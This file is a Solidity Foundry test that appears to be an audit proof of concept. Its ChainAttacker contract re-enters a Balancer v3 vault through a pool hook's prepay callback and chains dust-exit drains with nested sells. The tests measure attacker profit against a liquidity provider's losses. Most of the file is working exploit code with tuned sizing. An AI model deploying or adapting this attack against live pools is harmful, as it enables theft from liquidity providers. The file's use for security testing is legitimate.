// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Math} from "@crane/contracts/utils/Math.sol";
import {IVault} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IVault.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {
    VaultSwapParams,
    SwapKind
} from "@crane/contracts/external/balancer/v3/interfaces/contracts/vault/VaultTypes.sol";
import {IStandardExchangeBufferPool} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/standardExchange/IStandardExchangeBufferPool.sol";
import {TestBase_StandardExchangeBufferPool} from
    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";

interface IAeroRouterLite2 {
    struct Route { address from; address to; bool stable; address factory; }
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, Route[] calldata routes, address to, uint256 deadline)
        external returns (uint256[] memory amounts);
    function getReserves(address tokenA, address tokenB, bool stable, address _factory) external view returns (uint256, uint256);
}

/// @notice Stage-2 attacker. Same fake-prepay-router surface as hook-midstate-reentrancy/MidstateAttacker,
///         but SELLS shares it owns (drained in stage 1 via computeBalance-domain dust exits) instead of
///         buying them back. Nested sells re-enter Vault.swap from the hook's passPrepayAuth callback.
contract ChainAttacker {
    IVault public immutable vault;
    address public immutable pool;
    IERC20 public immutable tta;
    IERC20 public immutable shares;
    address public immutable owner;
    IAeroRouterLite2 public aero;
    IERC20 public usdc;
    address public aeroFactory;

    uint256[] public sells;
    uint256 public depth;
    bool public nest;
    bool public armed;
    bool public fixAero;
    uint256 public ttaReceived;
    uint256 public borrowed;
    uint256 public repaid;

    constructor(IVault v, address p, IERC20 t, IERC20 s, address o) {
        vault = v; pool = p; tta = t; shares = s; owner = o;
    }

    function setAero(IAeroRouterLite2 a, IERC20 u, address f) external {
        aero = a; usdc = u; aeroFactory = f;
        tta.approve(address(a), type(uint256).max);
        u.approve(address(a), type(uint256).max);
    }

    function prepaySessionActive() external pure returns (bool) { return true; }
    function restorePrepayAuth() external pure returns (bool) { return true; }

    function passPrepayAuth(address) external returns (bool) {
        require(msg.sender == pool, "only pool hook");
        if (!armed) return true;
        if (depth < sells.length) {
            (uint256 rD0, uint256 rU0) = aero.getReserves(address(tta), address(usdc), false, aeroFactory);
            uint256 s = sells[depth];
            depth++;
            _sell(s);
            if (fixAero) _restoreAero(rD0, rU0);
        }
        return true;
    }

    function _restoreAero(uint256 rD0, uint256 rU0) internal {
        (uint256 rD, uint256 rU) = aero.getReserves(address(tta), address(usdc), false, aeroFactory);
        uint256 target = Math.sqrt(Math.mulDiv(rD * rU, rD0, rU0));
        if (target <= rD) return;
        uint256 a = ((target - rD) * 106) / 100 + 1e15;
        vault.sendTo(tta, address(this), a); // in-unlock borrow; repaid below before unlock ends
        borrowed += a;
        IAeroRouterLite2.Route[] memory r = new IAeroRouterLite2.Route[](1);
        r[0] = IAeroRouterLite2.Route(address(tta), address(usdc), false, aeroFactory);
        aero.swapExactTokensForTokens(a, 0, r, address(this), block.timestamp);
    }

    function run(uint256[] calldata sells_, bool nest_, bool fixAero_) external returns (int256 net) {
        require(msg.sender == owner, "owner");
        delete sells;
        for (uint256 i; i < sells_.length; ++i) sells.push(sells_[i]);
        nest = nest_; fixAero = fixAero_;
        ttaReceived = 0; borrowed = 0; repaid = 0;
        uint256 before = tta.balanceOf(address(this));
        vault.unlock(abi.encodeCall(this.cb, ()));
        net = int256(tta.balanceOf(address(this))) - int256(before);
        // hand everything back to the attacker EOA
        tta.transfer(owner, tta.balanceOf(address(this)));
        uint256 sh = shares.balanceOf(address(this));
        if (sh > 0) shares.transfer(owner, sh);
    }

    bool public buyback; // if true: buy back all sold shares in-tx (zero-capital midstate, restores pool)
    function setBuyback(bool b) external { require(msg.sender == owner, "owner"); buyback = b; }

    function cb() external returns (bytes memory) {
        require(msg.sender == address(vault), "only vault");
        uint256 total;
        for (uint256 i; i < sells.length; ++i) total += sells[i];
        if (nest) {
            depth = 1; armed = true;
            _sell(sells[0]);
            armed = false;
            require(depth == sells.length, "not all nested sells fired");
        } else {
            for (uint256 i; i < sells.length; ++i) _sell(sells[i]);
        }
        uint256 u = usdc.balanceOf(address(this));
        if (u > 0) {
            IAeroRouterLite2.Route[] memory r = new IAeroRouterLite2.Route[](1);
            r[0] = IAeroRouterLite2.Route(address(usdc), address(tta), false, aeroFactory);
            uint256[] memory am = aero.swapExactTokensForTokens(u, 0, r, address(this), block.timestamp);
            repaid = am[am.length - 1];
        }
        if (buyback) {
            // buy back exactly the shares sold (zero-capital midstate); share delta nets 0.
            uint256 remaining = total;
            uint256 chunk = total / 5 + 1;
            while (remaining > 0) {
                uint256 c_ = remaining < chunk ? remaining : chunk;
                vault.swap(VaultSwapParams({
                    kind: SwapKind.EXACT_OUT, pool: pool, tokenIn: tta, tokenOut: shares,
                    amountGivenRaw: c_, limitRaw: type(uint256).max, userData: ""
                }));
                remaining -= c_;
            }
        } else {
            // pay the shares we sold out of our own (pre-owned) balance
            shares.transfer(address(vault), total);
            vault.settle(shares, total);
        }
        if (repaid > 0) {
            tta.transfer(address(vault), repaid);
            vault.settle(tta, repaid);
        }
        require(vault.getTokenDelta(shares) == 0, "share delta");
        int256 d = vault.getTokenDelta(tta);
        if (d < 0) vault.sendTo(tta, address(this), uint256(-d));
        else if (d > 0) { tta.transfer(address(vault), uint256(d)); vault.settle(tta, uint256(d)); }
        require(vault.getTokenDelta(tta) == 0, "tta delta");
        return "";
    }

    function _sell(uint256 s) internal {
        (, , uint256 out) = vault.swap(VaultSwapParams({
            kind: SwapKind.EXACT_IN, pool: pool, tokenIn: shares, tokenOut: tta,
            amountGivenRaw: s, limitRaw: 0, userData: ""
        }));
        ttaReceived += out;
    }
}

contract ChainReentrancyRouterTest is TestBase_StandardExchangeBufferPool {
    IStandardExchangeBufferPool internal P;
    ChainAttacker internal atk;
    uint256 internal rate0;
    uint256 internal V0; // attacker start value @rate0
    uint256 internal aliceV0;

    function setUp() public override {
        super.setUp();
        P = IStandardExchangeBufferPool(bufferPool);
        vm.prank(bob);
        atk = new ChainAttacker(bv3Vault, bufferPool, tta, shares, bob);
        atk.setAero(IAeroRouterLite2(address(aeroRouter)), IERC20(address(usdc)), address(aeroPoolFactory));
        vm.label(address(atk), "ChainAttacker");
    }

    // ------------------------------------------------------------------ helpers
    function _poolBal(uint256 idx) internal view returns (uint256) {
        (,, uint256[] memory raw,) = bv3Vault.getPoolTokenInfo(bufferPool);
        return raw[idx];
    }

    function _derivedYRaw() internal view returns (uint256) {
        int256 h = P.hookSharesDelta();
        uint256 b = _poolBal(P.sharesIndex());
        return h >= 0 ? b - uint256(h) : b + uint256(-h);
    }

    function _bobValue() internal view returns (uint256) {
        // everything the attacker owns, at the PRE-attack share rate
        return tta.balanceOf(bob) + tta.balanceOf(address(atk))
            + (shares.balanceOf(bob) + shares.balanceOf(address(atk))) * rate0 / 1e18;
    }

    function _aliceValueAt(uint256 rate) internal returns (uint256 v) {
        uint256 snap = vm.snapshotState();
        uint256 bal = IERC20(bufferPool).balanceOf(alice);
        uint256 t0 = tta.balanceOf(alice);
        uint256 s0 = shares.balanceOf(alice);
        removeLiquidityProportional(alice, bal, 0, 0);
        v = (tta.balanceOf(alice) - t0) + (shares.balanceOf(alice) - s0) * rate / 1e18;
        vm.revertToState(snap);
    }

    function _log(string memory tag) internal view {
        console2.log(tag);
        console2.log("  virtualTTA      ", P.virtualTTA());
        console2.log("  hookSharesDelta ", P.hookSharesDelta());
        console2.log("  pool live shares", _poolBal(P.sharesIndex()));
        console2.log("  pool live TTA   ", _poolBal(P.ttaIndex()));
        console2.log("  derivedY raw    ", _derivedYRaw());
    }

    function exitExt(uint256 bptIn) external returns (uint256 o) {
        require(msg.sender == address(this));
        vm.startPrank(bob);
        o = router.removeLiquiditySingleTokenExactIn(bufferPool, bptIn, shares, 1, false, bytes(""));
        vm.stopPrank();
    }

    /// Stage 0: attacker capital (counted as cost at rate0): 100 TTA + ~1 share.
    function _fund() internal {
        mintShares(bob, 1e18);
        mintTTA(bob, 100e18);
        vm.prank(bob);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
        rate0 = seRateProvider.getRate();
        V0 = _bobValue();
        aliceV0 = _aliceValueAt(rate0);
    }

    /// Stage 1 (balancer-buffer-computebalance-domain): set h>0 with a TTA->shares swap, then
    /// n dust SINGLE_TOKEN_EXACT_IN exits to the shares token, each paying ~lift(h).
    function _stage1(uint256 n) internal returns (uint256 drained) {
        uint256 bpt = addLiquidityUnbalanced(bob, 0, shares.balanceOf(bob));
        swapTTAforShares(bob, 100e18);
        uint256 chunk = bpt / n;
        for (uint256 i; i < n; ++i) {
            try this.exitExt(chunk) returns (uint256 o) { drained += o; } catch { console2.log("  exit reverted at", i); break; }
        }
        uint256 rem = IERC20(bufferPool).balanceOf(bob);
        if (rem > 0) removeLiquidityProportional(bob, rem, 0, 0);
    }

    /// Stage 2 sizing: s* = sqrt(x * yRaw / rate) - yRaw  (50/50 effective weights at baseline rate)
    function _sells(uint256 multBps, uint256 levels) internal view returns (uint256[] memory s) {
        uint256 x = P.virtualTTA();
        uint256 y = _derivedYRaw();
        uint256 tgt = Math.sqrt(Math.mulDiv(x, y * 1e18, rate0));
        uint256 sStar = tgt > y ? tgt - y : 0;
        uint256 tot = sStar * multBps / 10_000;
        uint256 have = shares.balanceOf(bob);
        if (tot > have) tot = have;
        s = new uint256[](levels);
        // geometric-ish split 40/30/20/10 (or equal for other level counts)
        if (levels == 4) {
            s[0] = tot * 40 / 100; s[1] = tot * 30 / 100; s[2] = tot * 20 / 100; s[3] = tot * 10 / 100;
        } else {
            for (uint256 i; i < levels; ++i) s[i] = tot / levels;
        }
    }

    function _stage2(uint256 multBps, uint256 levels, bool nest_) internal returns (int256 net) {
        uint256[] memory s = _sells(multBps, levels);
        uint256 tot;
        for (uint256 i; i < s.length; ++i) tot += s[i];
        vm.prank(bob);
        shares.transfer(address(atk), tot);
        vm.prank(bob);
        net = atk.run(s, nest_, nest_);
    }

    struct Res { int256 profit; int256 aliceLoss; uint256 drained; }

    /// mode 0 = stage1 only; 1 = stage1 + sequential sells; 2 = stage1 + nested midstate sells
    function _scenario(uint256 n, uint256 multBps, uint256 levels, uint256 mode) internal returns (Res memory r) {
        _fund();
        r.drained = _stage1(n);
        if (mode > 0) _stage2(multBps, levels, mode == 2);
        assertEq(IERC20(bufferPool).balanceOf(bob), 0, "no residual BPT");
        assertEq(usdc.balanceOf(address(atk)), 0, "no hidden USDC");
        r.profit = int256(_bobValue()) - int256(V0);
        r.aliceLoss = int256(aliceV0) - int256(_aliceValueAt(rate0));
    }

    function _print(string memory tag, Res memory r) internal pure {
        console2.log(tag);
        console2.log("    attacker profit @rate0 (TTA wei)");
        console2.logInt(r.profit);
        console2.log("    alice loss @rate0 (TTA wei)");
        console2.logInt(r.aliceLoss);
    }

    // ------------------------------------------------------------------ tests

    /// Grid: single primitive (computeBalance) vs chained, all from the same fresh state.
    function test_grid() public {
        uint256[4] memory ns = [uint256(20), 40, 80, 160];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            Res memory r = _scenario(ns[i], 0, 0, 0);
            console2.log("== single computeBalance, n exits =", ns[i]);
            _print("", r);
            vm.revertToState(snap);
        }
        // chain: full stage-1 drain (n=80) THEN a stage-2 sell, sequential vs nested.
        uint256[4] memory ms = [uint256(3_000), 6_000, 10_000, 16_000];
        for (uint256 j; j < ms.length; ++j) {
            for (uint256 mode = 1; mode <= 2; ++mode) {
                uint256 snap = vm.snapshotState();
                try this.scenarioExt(80, ms[j], 4, mode) returns (int256 p, int256 l) {
                    console2.log(mode == 1 ? "== chain SEQ  n=80 multBps" : "== chain NEST n=80 multBps", ms[j]);
                    console2.log("    profit / aliceLoss");
                    console2.logInt(p); console2.logInt(l);
                } catch (bytes memory err) {
                    console2.log(mode == 1 ? "== chain SEQ  REVERT multBps" : "== chain NEST REVERT multBps", ms[j]);
                    console2.logBytes(err);
                }
                vm.revertToState(snap);
            }
        }
    }

    function scenarioExt(uint256 n, uint256 m, uint256 lv, uint256 mode) external returns (int256, int256) {
        require(msg.sender == address(this));
        Res memory r = _scenario(n, m, lv, mode);
        return (r.profit, r.aliceLoss);
    }

    /// Composition in the OTHER order: zero-capital midstate-nested (buyback, restores pool) FIRST,
    /// then the computeBalance dust-drain. If the primitives add, total > best single (3653).
    function test_sequence_midstateThenCompute() public {
        _fund();
        // --- midstate nested, zero-capital, buyback (does NOT consume share inventory) ---
        vm.prank(bob); atk.setBuyback(true);
        // EXACT sizing from the confirmed hook-midstate PoC: sells = 25/20/15/10% of derivedY.
        uint256 y = _derivedYRaw();
        uint256[] memory s = new uint256[](4);
        s[0] = y * 2500 / 10_000; s[1] = y * 2000 / 10_000; s[2] = y * 1500 / 10_000; s[3] = y * 1000 / 10_000;
        vm.prank(bob);
        int256 mnet = atk.run(s, true, true);
        console2.log("midstate-first net (TTA wei)");
        console2.logInt(mnet);
        _log("after midstate");
        // --- then computeBalance dust drain ---
        uint256 drained = _stage1(80);
        console2.log("computeBalance drained shares", drained);
        assertEq(IERC20(bufferPool).balanceOf(bob), 0, "no residual BPT");
        assertEq(usdc.balanceOf(address(atk)), 0, "no hidden USDC");
        int256 profit = int256(_bobValue()) - int256(V0);
        int256 aliceLoss = int256(aliceV0) - int256(_aliceValueAt(rate0));
        console2.log("COMPOSITE profit @rate0 (TTA wei)");
        console2.logInt(profit);
        console2.log("alice loss @rate0 (TTA wei)");
        console2.logInt(aliceLoss);
        console2.log("best single primitive (computeBalance) ~3653e18");
    }
}
